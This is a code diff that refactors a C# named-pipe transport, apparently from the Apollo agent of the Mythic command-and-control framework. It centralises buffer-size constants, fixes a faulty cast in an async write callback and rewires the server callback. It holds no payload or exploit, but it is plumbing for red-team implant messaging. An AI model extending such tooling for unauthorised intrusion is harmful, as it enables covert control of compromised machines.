@@ -14,6 +14,7 @@ using ApolloInterop.Enums.ApolloEnums;
 using System.Threading;
 using ST = System.Threading.Tasks;
 using ApolloInterop.Serializers;
+using ApolloInterop.Constants;
 
 namespace NamedPipeTransport
 {
@@ -22,10 +23,7 @@ namespace NamedPipeTransport
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
         private string _namedPipeName;
         private AsyncNamedPipeServer _server;
-        private INamedPipeCallback _callback;
         private bool _encryptedExchangeCheck;
-        private const int _SERVER_SEND_SIZE = 30000;
-        private const int _SERVER_RECV_SIZE = 30000;
         private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
         private Dictionary<PipeStream, ST.Task> _writerTasks = new Dictionary<PipeStream, ST.Task>();
@@ -37,11 +35,12 @@ namespace NamedPipeTransport
             _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
             _sendAction = (object p) =>
             {
-                while (((PipeStream)p).IsConnected)
+                PipeStream pipe = (PipeStream)p;
+                while (pipe.IsConnected)
                 {
                     if (_senderQueue.TryDequeue(out byte[] result))
                     {
-                        ((PipeStream)p).BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                     }
                     else
                     {
@@ -82,8 +81,9 @@ namespace NamedPipeTransport
 
         private void OnAsyncMessageSent(IAsyncResult result)
         {
-            PipeStream pipe = (PipeStream)result;
+            PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
+            // Potentially delete this since theoretically the sender Task does everything
             if (_senderQueue.TryDequeue(out byte[] data))
             {
                 pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
@@ -92,7 +92,7 @@ namespace NamedPipeTransport
 
         private bool AddToSenderQueue(IMythicMessage msg)
         {
-            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, _SERVER_SEND_SIZE - 1000);
+            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, IPC.SEND_SIZE - 1000);
             foreach(IPCChunkedData part in parts)
             {
                 _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
@@ -131,7 +131,7 @@ namespace NamedPipeTransport
         {
             if (_server == null)
             {
-                _server = new AsyncNamedPipeServer(_namedPipeName, _callback, null, 1, _SERVER_SEND_SIZE, _SERVER_RECV_SIZE);
+                _server = new AsyncNamedPipeServer(_namedPipeName, this, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
             }
 
             if (_encryptedExchangeCheck)
